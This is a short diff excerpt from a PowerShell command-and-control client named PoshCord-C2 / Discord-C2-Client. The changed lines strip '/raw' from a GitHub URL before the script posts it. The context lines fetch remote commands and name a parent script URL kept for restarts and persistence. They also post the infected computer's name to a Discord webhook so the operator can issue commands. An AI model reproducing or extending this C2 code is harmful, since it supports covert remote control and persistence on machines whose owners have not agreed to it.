@@ -73,7 +73,9 @@ $version = "1.7.0" # Current Version
 $parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $response = Invoke-RestMethod -Uri $GHurl
 $previouscmd = $response
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":link: ``Enter Commands Here`` - $GHUrl :link:"} | ConvertTo-Json
+
+$noraw = $ghurl -replace "/raw", ""
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":link: ``Enter Commands Here`` - $noraw :link:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 
 Function Options{
